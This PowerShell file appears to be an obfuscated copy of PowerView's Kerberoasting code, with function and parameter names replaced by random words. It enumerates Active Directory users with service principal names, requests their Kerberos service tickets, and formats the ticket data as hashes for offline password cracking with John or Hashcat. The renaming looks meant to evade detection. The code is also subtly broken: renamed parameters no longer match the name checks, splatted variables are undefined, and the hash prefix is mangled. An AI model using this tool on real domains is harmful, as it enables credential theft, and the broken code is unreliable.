function carded {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $JcsdmZnW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $QOCsDCpn99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mQSDOBEl99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $JjVmUcsp99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gjIwSrNX99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $TPmSQNdW99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $bsePcQhO99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $WTSeqEeY99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $RQAZgUDK99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $PuVpWito99,
        [Switch]
        $HqyhCeNW99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $XtMvUzHu99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $JbcOvjGr99 = $JcsdmZnW99
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $omZFyIdA99 = terminology -XtMvUzHu99 $XtMvUzHu99
            }
            else {
                $omZFyIdA99 = terminology
            }
            $JbcOvjGr99 = $omZFyIdA99.Name
        }
        if (-not $PSBoundParameters['Server']) {
            try {
                if ($omZFyIdA99) {
                    $VhHBLEGP99 = $omZFyIdA99.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $VhHBLEGP99 = ((terminology -XtMvUzHu99 $XtMvUzHu99).PdcRoleOwner).Name
                }
                else {
                    $VhHBLEGP99 = ((terminology).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[carded] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $VhHBLEGP99 = $TPmSQNdW99
        }
        $DCMawazb99 = 'LDAP://'
        if ($VhHBLEGP99 -and ($VhHBLEGP99.Trim() -ne '')) {
            $DCMawazb99 += $VhHBLEGP99
            if ($JbcOvjGr99) {
                $DCMawazb99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $DCMawazb99 += $gjIwSrNX99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($JjVmUcsp99 -Match '^GC://') {
                $DN = $JjVmUcsp99.ToUpper().Trim('/')
                $DCMawazb99 = ''
            }
            else {
                if ($JjVmUcsp99 -match '^LDAP://') {
                    if ($JjVmUcsp99 -match "LDAP://.+/.+") {
                        $DCMawazb99 = ''
                        $DN = $JjVmUcsp99
                    }
                    else {
                        $DN = $JjVmUcsp99.SubString(7)
                    }
                }
                else {
                    $DN = $JjVmUcsp99
                }
            }
        }
        else {
            if ($JbcOvjGr99 -and ($JbcOvjGr99.Trim() -ne '')) {
                $DN = "DC=$($JbcOvjGr99.Replace('.', ',DC='))"
            }
        }
        $DCMawazb99 += $DN
        Write-Verbose "[carded] search string: $DCMawazb99"
        if ($XtMvUzHu99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[carded] Using alternate credentials for LDAP connection"
            $omZFyIdA99 = New-Object DirectoryServices.DirectoryEntry($DCMawazb99, $XtMvUzHu99.UserName, $XtMvUzHu99.GetNetworkCredential().Password)
            $BujhsaQA99 = New-Object System.DirectoryServices.DirectorySearcher($omZFyIdA99)
        }
        else {
            $BujhsaQA99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$DCMawazb99)
        }
        $BujhsaQA99.PageSize = $WTSeqEeY99
        $BujhsaQA99.SearchScope = $bsePcQhO99
        $BujhsaQA99.CacheResults = $False
        $BujhsaQA99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $BujhsaQA99.ServerTimeLimit = $RQAZgUDK99
        }
        if ($PSBoundParameters['Tombstone']) {
            $BujhsaQA99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $BujhsaQA99.filter = $QOCsDCpn99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $BujhsaQA99.SecurityMasks = Switch ($PuVpWito99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $KXxNuHHl99 = $mQSDOBEl99| ForEach-Object { $_.Split(',') }
            $Null = $BujhsaQA99.PropertiesToLoad.AddRange(($KXxNuHHl99))
        }
        $BujhsaQA99
    }
}
function discountenance {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $mQSDOBEl99
    )
    $yoNriNzh99 = @{}
    $mQSDOBEl99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $yoNriNzh99[$_] = $mQSDOBEl99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $yoNriNzh99[$_] = $mQSDOBEl99[$_][0] -as $NFmGapcZ99
            }
            elseif ($_ -eq 'samaccounttype') {
                $yoNriNzh99[$_] = $mQSDOBEl99[$_][0] -as $iQNwOeFb99
            }
            elseif ($_ -eq 'objectguid') {
                $yoNriNzh99[$_] = (New-Object Guid (,$mQSDOBEl99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $yoNriNzh99[$_] = $mQSDOBEl99[$_][0] -as $PQzPsTDG99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $aGYJHENE99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $mQSDOBEl99[$_][0], 0
                if ($aGYJHENE99.Owner) {
                    $yoNriNzh99['Owner'] = $aGYJHENE99.Owner
                }
                if ($aGYJHENE99.Group) {
                    $yoNriNzh99['Group'] = $aGYJHENE99.Group
                }
                if ($aGYJHENE99.DiscretionaryAcl) {
                    $yoNriNzh99['DiscretionaryAcl'] = $aGYJHENE99.DiscretionaryAcl
                }
                if ($aGYJHENE99.SystemAcl) {
                    $yoNriNzh99['SystemAcl'] = $aGYJHENE99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($mQSDOBEl99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $yoNriNzh99[$_] = "NEVER"
                }
                else {
                    $yoNriNzh99[$_] = [datetime]::fromfiletime($mQSDOBEl99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($mQSDOBEl99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $mQSDOBEl99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $yoNriNzh99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $yoNriNzh99[$_] = ([datetime]::FromFileTime(($mQSDOBEl99[$_][0])))
                }
            }
            elseif ($mQSDOBEl99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $mQSDOBEl99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $yoNriNzh99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[discountenance] error: $_"
                    $yoNriNzh99[$_] = $Prop[$_]
                }
            }
            elseif ($mQSDOBEl99[$_].count -eq 1) {
                $yoNriNzh99[$_] = $mQSDOBEl99[$_][0]
            }
            else {
                $yoNriNzh99[$_] = $mQSDOBEl99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $yoNriNzh99
    }
    catch {
        Write-Warning "[discountenance] Error parsing LDAP properties : $_"
    }
}
function terminology {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $JcsdmZnW99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $XtMvUzHu99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[terminology] Using alternate credentials for terminology'
            if ($PSBoundParameters['Domain']) {
                $JbcOvjGr99 = $JcsdmZnW99
            }
            else {
                $JbcOvjGr99 = $XtMvUzHu99.GetNetworkCredential().Domain
                Write-Verbose "[terminology] Extracted domain '$JbcOvjGr99' from -XtMvUzHu99"
            }
            $VYFCTaOC99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $JbcOvjGr99, $XtMvUzHu99.UserName, $XtMvUzHu99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($VYFCTaOC99)
            }
            catch {
                Write-Verbose "[terminology] The specified domain '$JbcOvjGr99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $VYFCTaOC99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $JcsdmZnW99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($VYFCTaOC99)
            }
            catch {
                Write-Verbose "[terminology] The specified domain '$JcsdmZnW99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[terminology] Error retrieving the current domain: $_"
            }
        }
    }
}
function tussled {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $xjqAYtAr99 = 'John',
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $iKyFLmLh99 = .3,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $XtMvUzHu99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $HyRLiNlE99 = Invoke-UserImpersonation -XtMvUzHu99 $XtMvUzHu99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $dejSAOOO99 = $User
        }
        else {
            $dejSAOOO99 = $SPN
        }
	
	$kNoLyKef99 = New-Object System.Random
        ForEach ($Object in $dejSAOOO99) {
            if ($PSBoundParameters['User']) {
                $kdKIUngm99 = $Object.ServicePrincipalName
                $mnEdALPB99 = $Object.SamAccountName
                $QyNEclue99 = $Object.DistinguishedName
            }
            else {
                $kdKIUngm99 = $Object
                $mnEdALPB99 = 'UNKNOWN'
                $QyNEclue99 = 'UNKNOWN'
            }
            if ($kdKIUngm99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $kdKIUngm99 = $kdKIUngm99[0]
            }
            try {
                $AtwEORTJ99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $kdKIUngm99
            }
            catch {
                Write-Warning "[tussled] Error requesting ticket for SPN '$kdKIUngm99' from user '$QyNEclue99' : $_"
            }
            if ($AtwEORTJ99) {
                $osCTJIQv99 = $AtwEORTJ99.GetRequest()
            }
            if ($osCTJIQv99) {
                $Out = New-Object PSObject
                $UpdXJJXl99 = [System.BitConverter]::ToString($osCTJIQv99) -replace '-'
                if($UpdXJJXl99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $KhKiStZP99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $imSuilqk99 = $Matches.DataToEnd.Substring(0,$KhKiStZP99*2)
                    if($Matches.DataToEnd.Substring($KhKiStZP99*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($AtwEORTJ99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($osCTJIQv99).Replace('-',''))
                    } else {
                        $Hash = "$($imSuilqk99.Substring(0,32))`$$($imSuilqk99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($AtwEORTJ99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($osCTJIQv99).Replace('-',''))
                }
                if($Hash) {
                    if ($xjqAYtAr99 -match 'John') {
                        $wNOyKPrG99 = "`$lOVbasBN99`$$($AtwEORTJ99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($QyNEclue99 -ne 'UNKNOWN') {
                            $FOjqmALc99 = $QyNEclue99.SubString($QyNEclue99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $FOjqmALc99 = 'UNKNOWN'
                        }
                        $wNOyKPrG99 = "`$lOVbasBN99`$$($Etype)`$*$mnEdALPB99`$$FOjqmALc99`$$($AtwEORTJ99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $wNOyKPrG99
                }
                $Out | Add-Member Noteproperty 'SamAccountName' $mnEdALPB99
                $Out | Add-Member Noteproperty 'DistinguishedName' $QyNEclue99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $AtwEORTJ99.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
            Start-Sleep -Seconds $kNoLyKef99.Next((1-$iKyFLmLh99)*$Delay, (1+$iKyFLmLh99)*$Delay)
        }
    }
    END {
        if ($HyRLiNlE99) {
            Invoke-RevertToSelf -TokenHandle $HyRLiNlE99
        }
    }
}
function shibboleth {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $neFvPDmz99,
        [Switch]
        $SPN,
        [Switch]
        $yjznyZhE99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $dTFvtkpV99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $usnYyNeg99,
        [Switch]
        $uFcduAgL99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $ELIKMxiZ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $JcsdmZnW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $QOCsDCpn99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mQSDOBEl99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $JjVmUcsp99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $TPmSQNdW99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $bsePcQhO99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $WTSeqEeY99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $RQAZgUDK99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $PuVpWito99,
        [Switch]
        $HqyhCeNW99,
        [Alias('ReturnOne')]
        [Switch]
        $OjihOwbx99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $XtMvUzHu99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $tDHZYuVg99 = @{}
        if ($PSBoundParameters['Domain']) { $tDHZYuVg99['Domain'] = $JcsdmZnW99 }
        if ($PSBoundParameters['Properties']) { $tDHZYuVg99['Properties'] = $mQSDOBEl99 }
        if ($PSBoundParameters['SearchBase']) { $tDHZYuVg99['SearchBase'] = $JjVmUcsp99 }
        if ($PSBoundParameters['Server']) { $tDHZYuVg99['Server'] = $TPmSQNdW99 }
        if ($PSBoundParameters['SearchScope']) { $tDHZYuVg99['SearchScope'] = $bsePcQhO99 }
        if ($PSBoundParameters['ResultPageSize']) { $tDHZYuVg99['ResultPageSize'] = $WTSeqEeY99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $tDHZYuVg99['ServerTimeLimit'] = $RQAZgUDK99 }
        if ($PSBoundParameters['SecurityMasks']) { $tDHZYuVg99['SecurityMasks'] = $PuVpWito99 }
        if ($PSBoundParameters['Tombstone']) { $tDHZYuVg99['Tombstone'] = $HqyhCeNW99 }
        if ($PSBoundParameters['Credential']) { $tDHZYuVg99['Credential'] = $XtMvUzHu99 }
        $AvLivppX99 = carded @SearcherArguments
    }
    PROCESS {
        if ($AvLivppX99) {
            $yaUjsFpQ99 = ''
            $JhurEHNS99 = ''
            $neFvPDmz99 | Where-Object {$_} | ForEach-Object {
                $kuIJRirE99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($kuIJRirE99 -match '^S-1-') {
                    $yaUjsFpQ99 += "(objectsid=$kuIJRirE99)"
                }
                elseif ($kuIJRirE99 -match '^CN=') {
                    $yaUjsFpQ99 += "(distinguishedname=$kuIJRirE99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $slXpWhHZ99 = $kuIJRirE99.SubString($kuIJRirE99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[shibboleth] Extracted domain '$slXpWhHZ99' from '$kuIJRirE99'"
                        $tDHZYuVg99['Domain'] = $slXpWhHZ99
                        $AvLivppX99 = carded @SearcherArguments
                        if (-not $AvLivppX99) {
                            Write-Warning "[shibboleth] Unable to retrieve domain searcher for '$slXpWhHZ99'"
                        }
                    }
                }
                elseif ($kuIJRirE99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $EPKsnujU99 = (([Guid]$kuIJRirE99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $yaUjsFpQ99 += "(objectguid=$EPKsnujU99)"
                }
                elseif ($kuIJRirE99.Contains('\')) {
                    $hBPmjUzf99 = $kuIJRirE99.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($hBPmjUzf99) {
                        $FOjqmALc99 = $hBPmjUzf99.SubString(0, $hBPmjUzf99.IndexOf('/'))
                        $IipmyEip99 = $kuIJRirE99.Split('\')[1]
                        $yaUjsFpQ99 += "(samAccountName=$IipmyEip99)"
                        $tDHZYuVg99['Domain'] = $FOjqmALc99
                        Write-Verbose "[shibboleth] Extracted domain '$FOjqmALc99' from '$kuIJRirE99'"
                        $AvLivppX99 = carded @SearcherArguments
                    }
                }
                else {
                    $yaUjsFpQ99 += "(samAccountName=$kuIJRirE99)"
                }
            }
            if ($yaUjsFpQ99 -and ($yaUjsFpQ99.Trim() -ne '') ) {
                $JhurEHNS99 += "(|$yaUjsFpQ99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[shibboleth] Searching for non-null service principal names'
                $JhurEHNS99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[shibboleth] Searching for users who can be delegated'
                $JhurEHNS99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[shibboleth] Searching for users who are sensitive and not trusted for delegation'
                $JhurEHNS99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[shibboleth] Searching for adminCount=1'
                $JhurEHNS99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[shibboleth] Searching for users that are trusted to authenticate for other principals'
                $JhurEHNS99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[shibboleth] Searching for user accounts that do not require kerberos preauthenticate'
                $JhurEHNS99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[shibboleth] Using additional LDAP filter: $QOCsDCpn99"
                $JhurEHNS99 += "$QOCsDCpn99"
            }
            $KziWESte99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $KVYSHrgj99 = $_.Substring(4)
                    $QLGONmXQ99 = [Int]($PQzPsTDG99::$KVYSHrgj99)
                    $JhurEHNS99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$QLGONmXQ99))"
                }
                else {
                    $QLGONmXQ99 = [Int]($PQzPsTDG99::$_)
                    $JhurEHNS99 += "(userAccountControl:1.2.840.113556.1.4.803:=$QLGONmXQ99)"
                }
            }
            $AvLivppX99.filter = "(&(samAccountType=805306368)$JhurEHNS99)"
            Write-Verbose "[shibboleth] filter string: $($AvLivppX99.filter)"
            if ($PSBoundParameters['FindOne']) { $qMwJbFTI99 = $AvLivppX99.FindOne() }
            else { $qMwJbFTI99 = $AvLivppX99.FindAll() }
            $qMwJbFTI99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = discountenance -mQSDOBEl99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($qMwJbFTI99) {
                try { $qMwJbFTI99.dispose() }
                catch {
                    Write-Verbose "[shibboleth] Error disposing of the Results object: $_"
                }
            }
            $AvLivppX99.dispose()
        }
    }
}
function Hapsburg {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $neFvPDmz99,
        [ValidateNotNullOrEmpty()]
        [String]
        $JcsdmZnW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $QOCsDCpn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $JjVmUcsp99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $TPmSQNdW99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $bsePcQhO99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $WTSeqEeY99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $RQAZgUDK99,
        [Switch]
        $HqyhCeNW99,
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $iKyFLmLh99 = .3,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $xjqAYtAr99 = 'John',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $XtMvUzHu99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cwInsmmb99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $cwInsmmb99['Domain'] = $JcsdmZnW99 }
        if ($PSBoundParameters['LDAPFilter']) { $cwInsmmb99['LDAPFilter'] = $QOCsDCpn99 }
        if ($PSBoundParameters['SearchBase']) { $cwInsmmb99['SearchBase'] = $JjVmUcsp99 }
        if ($PSBoundParameters['Server']) { $cwInsmmb99['Server'] = $TPmSQNdW99 }
        if ($PSBoundParameters['SearchScope']) { $cwInsmmb99['SearchScope'] = $bsePcQhO99 }
        if ($PSBoundParameters['ResultPageSize']) { $cwInsmmb99['ResultPageSize'] = $WTSeqEeY99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cwInsmmb99['ServerTimeLimit'] = $RQAZgUDK99 }
        if ($PSBoundParameters['Tombstone']) { $cwInsmmb99['Tombstone'] = $HqyhCeNW99 }
        if ($PSBoundParameters['Credential']) { $cwInsmmb99['Credential'] = $XtMvUzHu99 }
        if ($PSBoundParameters['Credential']) {
            $HyRLiNlE99 = Invoke-UserImpersonation -XtMvUzHu99 $XtMvUzHu99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $cwInsmmb99['Identity'] = $neFvPDmz99 }
        shibboleth @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | tussled -Delay $Delay -xjqAYtAr99 $xjqAYtAr99 -iKyFLmLh99 $iKyFLmLh99
    }
    END {
        if ($HyRLiNlE99) {
            Invoke-RevertToSelf -TokenHandle $HyRLiNlE99
        }
    }
}
